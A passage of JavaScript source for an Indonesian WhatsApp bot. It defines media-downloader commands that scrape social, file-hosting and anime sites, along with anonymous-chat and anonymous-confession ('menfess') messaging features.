        if (quality.includes('Download MP4')) {
          result.download.push({
            link: $(el).attr('href'),
            quality
          })
        }
      })
    } else if ($('.video-data').length > 0 || $('.download-items__thumb img').length > 0) {
      result.type = 'photo'
      result.thumb = $('.download-items__thumb img').attr('src')
      result.download = $('.download-items__btn a').attr('href')
    }

    return result
  } catch (err) {
    throw 'Gagal mengunduh media dari Twitter/X. Coba lagi nanti.'
  }
}

    const res = await twitterDl(text)

    if (res.type === 'video' && res.download.length > 0) {
      const videoRes = await axios.get(res.download[0].link, {
        responseType: 'arraybuffer'
      })

      await Alice.sendMessage(m.chat, {
        video: videoRes.data,
        caption: `*Judul:* ${res.title || 'Tidak diketahui'}\n*Durasi:* ${res.duration || '-'}`
      }, { quoted: m })
    } else if (res.type === 'photo' && res.download) {
      const imgRes = await axios.get(res.download, { responseType: 'arraybuffer' })

      await Alice.sendMessage(m.chat, {
        image: imgRes.data,
        caption: 'Foto dari X/Twitter'
      }, { quoted: m })
    } else {
      ReplyRynzz('Media tidak ditemukan atau tidak didukung.')
    }
  } catch (err) {
    ReplyRynzz(typeof err === 'string' ? err : 'Terjadi kesalahan saat mengambil media.')
  }
}
break
case 'resepdownload': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Please provide a Cookpad recipe URL!\n\nExample: ${XyrooRynzz} https://cookpad.com/id/resep/1234567`);

async function getRecipeDetails(url) {
  let { data } = await axios.get(url);
  let $ = cheerio.load(data);

  let cookingTime = $(".recipe-show__meta-container .icon_with_text .recipe-show__time").text().trim();
  let ingredients = [];
  let steps = [];

  $(".ingredient").each((i, el) => {
    ingredients.push($(el).text().trim());
  });

  $(".step").each((i, el) => {
    steps.push($(el).text().trim());
  });

  return { cookingTime, ingredients, steps };
}

    const detail = await getRecipeDetails(text);

    if (!detail) {
      return ReplyRynzz('No details found for the given URL.');
    }

    let message = `
🍽️ *Recipe Details!* 🍽️
- ⏲️ Cooking Time: ${detail.cookingTime}
- 📝 Ingredients: ${detail.ingredients.join(', ')}
- 📖 Steps: ${detail.steps.join('\n')}
- 🔗 [View Recipe](${text})
    `;

    await Alice.sendMessage(m.chat, { text: message, footer: packname }, { quoted: m });
  } catch (error) {
    console.error(error);
    return ReplyRynzz("An error occurred: " + error.message);
  }
};
break

    case "nontonanime-detail": {
if (isBan) return Xban()
await xreaction()
        if (!args[0]) return ReplyRynzz("Masukkan URL anime!");
        const detail = await nontonAnime.details(args[0]);
        if (!detail) return ReplyRynzz("Gagal mengambil detail anime.");
        await Alice.sendMessage(m.chat, {
          image: { url: detail.thumbnail },
          caption: `*${detail.title}*\n\n${detail.synopsis}\n\nStatus: ${detail.status}\nStudio: ${detail.studio}\nSeason: ${detail.season}\nTipe: ${detail.type}`
        }, { quoted: m });
      }
      break;
      
    case "nontonanime-download": {
if (isBan) return Xban()
await xreaction()
        if (!args[0]) return ReplyRynzz("Masukkan link episode!");
        const links = await nontonAnime.download(args[0]);
        if (!links.length) return ReplyRynzz("Link download tidak ditemukan.");
        await Alice.sendMessage(m.chat, {
          text: `*Link Download:*\n\n${links.join("\n\n")}`,
        }, { quoted: m });
      }
      break;
            
      case "shortlink-dl": {
if (isBan) return Xban()
await xreaction()    
          if (!text) return ReplyRynzz(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          if (!isUrl(text)) return ReplyRynzz(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          var a = await fetch(
            `https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`
          );
          await Alice.sendMessage(m.chat, { text: a.url }, { quoted: m });
        }
        break;

case 'fb':
case 'fbdl':
case 'facebook' : {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('url facebook?')
    try {
      let res = await fdown.download(text);
      if (res && res.length > 0) {
        let videoData = res[0]; 
        let videoUrl = videoData.hdQualityLink || videoData.normalQualityLink; 
        if (videoUrl) {
          let caption = `*Title:* ${videoData.title}\n*Description:* ${videoData.description}\n*Duration:* ${videoData.duration}`;
          await Alice.sendMessage(m.chat, { 
            video: { url: videoUrl }, 
            caption: caption, 
            mimetype: 'video/mp4'
          }, { quoted: m });
        }
      } else {
        return ReplyRynzz(mess.error)
      }
    } catch (e) {
      console.log(e);
      Xerror()
    }
  }
break
case 'samehadakudl': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('Link?..');
    
    // Mengambil data dari API
    let cari = await (await fetch(`https://api.siputzx.my.id/api/anime/samehadaku/download?url=${text}`)).json();
    
    // Memeriksa status respon
    if (cari.status) {
        let title = cari.data.title;
        let cap = `*_PILIH LINK ALTERNATIF untuk ${title}*_` + '\n\n';
        
        // Mengiterasi unduhan
        for (let ciroo of cari.data.downloads) {
            cap += `*🏷️ ALTERNATIF ${ciroo.nume} :* ${ciroo.name}\n*🔗 LINK UNDUH :* ${ciroo.link || 'Tidak tersedia'}\n\n`;
        }
        
        await ReplyRynzz(cap);
    } else {
        await ReplyRynzz('Data tidak ditemukan.');
    }
}
break;

case 'apkdl': 
case 'apkdownload': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('link dari apksearch');
    
    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=download&url=` + text);
        let apk = await response.json();

        if (apk.status === 200 && apk.data.status === 200) {
            let app = apk.data.data;
            Alice.sendMessage(m.chat, {
                document: {
                    url: app.url
                },
                fileName: app.package + '.apk',
                mimetype: 'application/xapk',
                contextInfo: {
                    externalAdReply: {
                        title: app.title,
                        body: `${botname}`,
                        thumbnailUrl: app.img || '',
                        mediaType: 1,
                        showAdAttribution: true,
                        renderLargerThumbnail: false,
                    },
                },
            }, { quoted: m });
        } else {
            reply('ada masalah');
        }
    } catch (e) {
        reply('ada masalah');
    }
}
break;
case 'git':
case 'gitclone': {
  try {
    if (!args[0]) return ReplyRynzz(`Contoh: ${XyrooRynzz} linknya`)
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return ReplyRynzz(`Harus berupa link github!`)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    var [, userr, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    var url = `https://api.github.com/repos/${userr}/${repo}/zipball`
    let filename = (await fetch(url, {
      method: 'HEAD'
    })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Alice.sendMessage(m.chat, {
      document: {
        url: url
      },
      fileName: filename + '.zip',
      mimetype: 'application/zip'
    }, {
      quoted: m
    })
  } catch (err) {
    ReplyRynzz('Terjadi kesalahan')
  }
}
break
case 'telestick':
  case 'stickertele':
     case 'stele':{
if (isBan) return Xban()
await xreaction()
         if (args.length == 0) return ReplyRynzz(`mana url nya? contoh : ${XyrooRynzz} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon`); 
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
         await xreaction()
             let res = await Telesticker(args[0]);              
             if (m.isGroup && res.length > 30) {
                 await ReplyRynzz("sticker terdapat 30+ maka akan dikirim melalui private chat");
                 
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await Alice.sendImageAsSticker(m.sender, res[i].url, m, { 
                           packname: global.packname, 
                           author: global.author });        
                       await fs.unlinkSync(encmedia);
                       await sleep(9000);
                   }
             } else {
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await Alice.sendImageAsSticker(m.chat, res[i].url, m, {
                           packname: global.packname, 
                           author: global.author });
                       await fs.unlinkSync(encmedia)
                       await sleep(9000);           
                   }
               }
           }
       }
       break;

case 'pindl': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Link untuk di download`);

  try {
      const result = await PinDL(text);

      if (result.error) {
          return ReplyRynzz(`❌ *Error:* ${result.error}`);
      }

      let caption = `*Pinterest Downloader*\n${packname}`;

      if (result.type === "video") {
          console.log("🔗 Mengunduh video:", result.url);
          const response = await axios.get(result.url, { responseType: 'arraybuffer' });
          const videoBuffer = Buffer.from(response.data, 'binary');

          await Alice.sendMessage(from, { video: videoBuffer, mimetype: 'video/mp4', caption }, { quoted: m });

      } else {
          await Alice.sendMessage(from, { image: { url: result.url }, caption }, { quoted: m });
      }

  } catch (err) {
      console.error("Error saat mengambil media Pinterest:", err);
      ReplyRynzz("*Terjadi kesalahan saat mengambil media dari Pinterest!*\nCoba lagi nanti.");
  }
}
break

case 'cocofun':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Example: ${XyrooRynzz} https://www.icocofun.com/share/post/565326210234?lang=id&pkg=id&share_to=copy_link&m=06fa9a57a737be2bee99bea6bcdb20ee&d=7a1c5048f54ef09b7c0fa0f3c463692949f35fa30d93fc1130f6e8153f537b51&nt=1`)
await xreaction()
let old = new Date()
let asy = await chApi.cocofun(text)
let caption = `乂  *C O C O F U N*\n\n`
caption += `	◦  *Topic* : ${asy.topic}\n`
caption += `	◦  *Caption* : ${asy.caption}\n`
caption += `	◦  *Play* : ${asy.play}\n`
caption += `	◦  *Like* : ${asy.like}\n`
caption += `	◦  *Share* : ${asy.share}\n`
caption += `	◦  *Duration* : ${asy.duration}\n\n`
caption += `	◦  *Fetching* : ${((new Date - old) * 1)} ms\n\n` 
Alice.sendMessage(m.chat, { video: { url: asy.no_watermark }, caption: caption }, { quoted: m })
uselimit()
ReplyRynzz(`\`Usage 1 Limit , You Have ${limitnya} More\``)
}
break

case 'sf': case 'sfile': case 'sfiledl': case 'sfdl': {
if (isBan) return Xban()
await xreaction()
if (!text.includes('https://sfile.mobi')) return ReplyRynzz(`• *Example :* ${XyrooRynzz} https://sfile.mobi/xxxxxxx/`)

await xreaction()
const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

            const data = await this.convert(result, url);

            return { creator: `${ownername}`, status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: error.message };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - s ғ ]* ──⪼┓`
sfcap += `〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `〆 ᴜʀʟ : ${text}\n`
sfcap += `┗⪻─────────────────────────⪼┛`

await Alice.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted: m});
} catch (err) {
}}
break

case 'mfdl':
case 'mediafire': {
if (isBan) return Xban()
await xreaction()
 if (!text) return ReplyRynzz('sertakan link mediafire')
  try {
    const mediafireRegex = /(https?:\/\/(www\.)?mediafire\.com\/[^\s]+)/gi
    const match = budy.match(mediafireRegex)
    if (!match) return

    const link = match[0]
  await xreaction()

    const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${encodeURIComponent(link)}`)
    if (!api.status || !api.result || !api.result[0]) return ReplyRynzz('Gagal mengambil data dari API.')

    const data = api.result[0]
    const fileNama = decodeURIComponent(data.nama || 'file.zip')
    const extension = fileNama.split('.').pop().toLowerCase()

    const res = await axios.get(data.link, { responseType: 'arraybuffer' })
    const media = Buffer.from(res.data)

    let mimetype = ''
    if (extension === 'mp4') mimetype = 'video/mp4'
    else if (extension === 'mp3') mimetype = 'audio/mp3'
    else mimetype = `application/${extension}`

    await Alice.sendMessage(m.chat, {
      document: media,
      fileName: fileNama,
      mimetype: mimetype
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan saat mendownload: ' + err.message)
  }
}
break

case 'ccdl':
case 'capcut': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} linknya`)
    if (!text.includes('capcut.com') && !text.includes('capcut.net')) return ReplyRynzz('Harus berupa link capcut!')
    const videoData = await Capcut(text)

    if (videoData && videoData.medias && videoData.medias.length > 0) {
      const videoUrl = videoData.medias[0].url
      return await Alice.sendMessage(m.chat, {
        video: {
          url: videoUrl
        },
        caption: `© ${botname}`
      }, {
        quoted: m
      })
    } else {
      return ReplyRynzz('Video tidak ditemukan.')
    }
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'videy':
case 'videydl': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} linknya`)
    let twitter = await fetchJson(`https://vapis.my.id/api/videy?url=${Enc(text)}`)
    Alice.sendMessage(m.chat, {
      video: {
        url: twitter.data
      },
      caption: `${packname}`
    }, {
      quoted: m
    })
  } catch (err) {
    ReplyRynzz(`Terjadi kesalahan`);
  }
}
break

case 'ig':
case 'instagram': {
if (isBan) return Xban()
await xreaction()
if (isBan) return Xban()
await xreaction()
if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
    if (!text) return ReplyRynzz("Masukkan Linknya ?");
    if (!isURL(text)) return ReplyRynzz("Masukkan Linknya ?");
    await xreaction()
    const mediaUrl = await igdl(text);
    const url_media = mediaUrl[0].url;
    try {
        const response = await axios.head(url_media); 
        const contentType = response.headers['content-type']; // Mendapatkan tipe konten dari header
        if (contentType.startsWith('image/')) {
            await Alice.sendMessage(m.chat, { image: { url: url_media}, caption: 'donee' }, { quoted: m });
            return
        } else {
            await Alice.sendMessage(m.chat, { video: { url: url_media}, caption: 'donee' }, { quoted: m });
            return 
        }
    } catch(e) {
        return Xerror()
    }
uselimit()
ReplyRynzz(  Xlimit() )
}
break

case 'tt': 
case 'tiktok': {
if (isBan) return Xban()
await xreaction()
if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} linknya`)
await xreaction()
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await Alice.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
Alice.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
Alice.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
uselimit()
ReplyRynzz(  Xlimit() )
}
break

case 'aio': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Penggunaan: ${XyrooRynzz} [link video]\nLIST LINK YANG SUPPORT:\n- YouTube\n- instagram\n- tiktok\n- facebook\n- twitter\n- dan lain lainnya, masih banyak lagi`);
    
class Fuck extends Error {
    constructor(message) {
        super(message);
        this.name = "Fuck";
    }
}

class API {
    constructor(search, prefix) {
        this.api = {
            search: search,
            prefix: prefix
        };
    }

    headers(custom = {}) {
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'authority': 'retatube.com',
            'accept': '*/*',
            'accept-language': 'id-MM,id;q=0.9',
            'hx-current-url': 'https://retatube.com/',
            'hx-request': 'true',
            'hx-target': 'aio-parse-result',
            'hx-trigger': 'search-btn',
            'origin': 'https://retatube.com',
            'referer': 'https://retatube.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Postify/1.0.0',
            ...custom
        };
    }

    handleError(error, context) {
        const errors = error.response ? JSON.stringify(error.response.data || error.message) : error.message;
        console.error(`[${context}] Error:`, errors);
        throw new Fuck(errors);
    }

    getEndpoint(name) {
        return this.api[name];
    }
}

class RetaTube extends API {
    constructor() {
        super('https://retatube.com/api/v1/aio/search', 'https://retatube.com/api/v1/aio/index?s=retatube.com');
    }

    async getPrefix() {
        try {
            const response = await axios.get(this.getEndpoint('prefix'));
            return this.scrapePrefix(response.data); 
        } catch (error) {
            this.handleError(error, 'GetPrefix');
        }
    }

    scrapePrefix(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const prefix = $('#aio-search-box input[name="prefix"]').val();
        return prefix;
    }

    async fetch(videoId) {
        try {
            const prefix = await this.getPrefix();
            const response = await axios.post(this.getEndpoint('search'), `prefix=${encodeURIComponent(prefix)}&vid=${encodeURIComponent(videoId)}`, { headers: this.headers() });
            return this.parseHtml(response.data);
        } catch (error) {
            this.handleError(error, 'Fetch');
        }
    }

    parseHtml(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const result = {
            title: '',
            description: '',
            videoLinks: [],
            audioLinks: []
        };

        $('.col').each((_, element) => {
            const titles = $(element).find('#text-786685718 strong').first();
            result.title = titles.text().replace('Title：', '').trim() || result.title;

            const description = $(element).find('.description').text();
            result.description = description.trim() || '';

            $(element).find('a.button.primary').each((_, linkElement) => {
                const linkUrl = $(linkElement).attr('href');
                const quality = $(linkElement).find('span').text().toLowerCase();

                if (linkUrl !== 'javascript:void(0);') {
                    if (quality.includes('audio')) {
                        result.audioLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    } else {
                        result.videoLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    }
                }
            });
        });

        return result;
    }

    async scrape(links) {
        try {
            return await this.fetch(links);
        } catch (error) {
            console.error(`${error.message}`);
            throw error;
        }
    }
}

    const retatube = new RetaTube();
    try {
        const result = await retatube.scrape(text);
        let videoMessage = `*Judul*: ${result.title}\n*Deskripsi*: ${result.description}\n\n*Video*:`;
        let audioMessage = `*Audio*:`;

        // Mengirimkan video
        if (result.videoLinks.length > 0) {
            const video = result.videoLinks[0]; // Mengambil video dengan kualitas terbaik
            await Alice.sendMessage(m.chat, { video: { url: video.url }, caption: videoMessage }, { quoted: m });
        } else {
            await ReplyRynzz("Maaf, video tidak ditemukan.");
        }

     

    } catch (error) {
        await ReplyRynzz(`Terjadi kesalahan: ${error.message}`);
    }
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Downloader Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\




//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Menfess Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'anonymous':
case 'anonymouschat': {
if (isBan) return Xban()
await xreaction()
if (isBan) return Xban()
await xreaction()
if (!isPc) return Xpc()
  ReplyRynzz(`Hai ${pushname} selamat datang di Anonymous chat!\n\nKetik ${Xyroo}start untuk memulai sesi chat`)
}
break

case 'start':
case 'mulai': {
if (isBan) return Xban()
await xreaction()
if (!isPc) return Xpc()
  this.anonymous = this.anonymous ? this.anonymous : {}
  if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
    ReplyRynzz(`Kamu masih berada di dalam sesi Anonymous!\n\n${Xyroo}leave untuk keluar dari sesi chat`)
    return false
  }
  let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
  if (room) {
    Alice.sendMessage(room.a, {
      text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`
    })
    room.b = m.sender
    room.state = 'CHATTING'
    ReplyRynzz(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`)
  } else {
    let id = +new Date
    this.anonymous[id] = {
      id,
      a: m.sender,
      b: '',
      state: 'WAITING',
      check: function (who = '') {
        return [this.a, this.b].includes(who)
      },
      other: function (who = '') {
        return who === this.a ? this.b : who === this.b ? this.a : ''
      },
    }
    ReplyRynzz(`Menunggu partner...`)
  }
}
break

case 'leave':
case 'keluar': {
if (isBan) return Xban()
await xreaction()
if (!isPc) return Xpc()
  this.anonymous = this.anonymous ? this.anonymous : {}
  let room = Object.values(this.anonymous).find(room => room.check(m.sender))
  if (!room) {
    ReplyRynzz(`Kamu sedang tidak berada di sesi Anonymous!\n\n${Xyroo}start untuk memulai sesi chat`)
    return false
  }
  ReplyRynzz('Berhasil keluar dari Anonymous chat!')
  let other = room.other(m.sender)
  if (other) await Alice.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
  delete this.anonymous[room.id]
  if (command === 'leave')
    break
}
break

case 'skip':
case 'next':
case 'lanjut': {
if (isBan) return Xban()
await xreaction()
if (!isPc) return Xpc()
  this.anonymous = this.anonymous ? this.anonymous : {}
  let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
  if (!romeo) {
    ReplyRynzz(`Kamu sedang tidak berada di sesi Anonymous!\n\n${Xyroo}start untuk mencari partner`)
    return false
  }
  let other = romeo.other(m.sender)
  if (other) await Alice.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
  delete this.anonymous[romeo.id]
  let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
  if (room) {
    Alice.sendMessage(room.a, {
      text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`
    })
    room.b = m.sender
    room.state = 'CHATTING'
    ReplyRynzz(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`)
  } else {
    let id = +new Date
    this.anonymous[id] = {
      id,
      a: m.sender,
      b: '',
      state: 'WAITING',
      check: function (who = '') {
        return [this.a, this.b].includes(who)
      },
      other: function (who = '') {
        return who === this.a ? this.b : who === this.b ? this.a : ''
      },
    }
    ReplyRynzz(`Menunggu partner...`)
  }
}
break

case 'confes':
case 'menfes':
case 'confess':
case 'menfess': {
if (isBan) return Xban()
await xreaction()
    this.menfes = this.menfes ? this.menfes : {}
    const roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (m.isGroup) return Xpc()
    if (roof) return ReplyRynzz("Kamu masih berada dalam sesi menfess")
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`)
    if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} Nama, 628xxx, Menfes nih\n`)

    const parts = text.split(',').map(item => item.trim());
    if (parts.length < 3) return ReplyRynzz(`Format salah! Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`);
    
    const [namaNya, nomorNyaRaw, pesanNya] = parts;
    let nomorNya = nomorNyaRaw.startsWith('0') ? '62' + nomorNyaRaw.slice(1) : nomorNyaRaw;
    
    if (isNaN(nomorNya)) return ReplyRynzz(`Nomor tidak valid! Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`);
    
    const yoi = `Dari: ${namaNya}\nPesan: ${pesanNya}\n\nKlik *Terima* untuk menerima menfess\nKlik *Tolak* untuk menolak menfess`;
    const id = m.sender;
    
    this.menfes[id] = {
        id,
        a: m.sender,
        b: `${nomorNya}@s.whatsapp.net`,
        state: 'WAITING'
    };
    
    try {
        await Alice.sendMessage(`${nomorNya}@s.whatsapp.net`, {
            text: yoi,
            footer: ownername,
            buttons: [
                {
                    buttonId: '.balasmenfes',
                    buttonText: { displayText: 'Terima' },
                    type: 1
                },
                {
                    buttonId: '.tolakmenfes',
                    buttonText: { displayText: 'Tolak' },
                    type: 1
                }
            ],
            headerType: 1,
            viewOnce: true
        })
        ReplyRynzz('Pesan berhasil dikirim ke nomor tujuan. Semoga dibales ya')
    } catch (error) {
        console.error(error)
        ReplyRynzz('Pesan gagal dikirim. Periksa kembali nomor tujuan.')
    }
}
break

case 'balasconfes':
case 'balasmenfes':
case 'balasconfess':
case 'balasmenfess': {
if (isBan) return Xban()
await xreaction()
    roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!roof) return ReplyRynzz("Belum ada sesi menfess")
    find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
